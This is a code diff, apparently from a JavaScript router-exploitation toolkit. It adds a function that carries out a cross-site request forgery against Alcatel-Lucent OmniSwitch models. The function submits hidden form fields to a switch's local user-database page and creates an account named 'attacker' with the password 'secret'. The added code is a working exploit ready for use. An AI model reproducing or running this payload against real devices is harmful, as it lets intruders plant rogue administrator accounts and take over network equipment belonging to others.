@@ -2376,3 +2376,17 @@ function belkinwpspin()
 
 }
 
+// OmniSwitch 6450, 6250, 6850E, 9000E, 6400, 6855, 6900, 10K, 6860 Add user attacker:secret via CSRF
+function omniswitch_adduser(ip)
+{
+    ip = ip || "192.168.2.1";
+    var form = '<input type="hidden" name="EmWeb_ns:mip:2.T1:I1" value="attacker" />\
+    <input type="hidden" name="EmWeb_ns:mip:244.T1:O1" value="secret" />\
+    <input type="hidden" name="EmWeb_ns:mip:244.T1:O2" value="-1" />\
+    <input type="hidden" name="EmWeb_ns:mip:244.T1:O3" value="" />\
+    <input type="hidden" name="EmWeb_ns:mip:244.T1:O4" value="1" />\
+    <input type="hidden" name="EmWeb_ns:mip:244.T1:O5" value="4" />';
+	
+    post('http://' + ip + '/sec/content/sec_asa_users_local_db_add.html', form);
+
+}
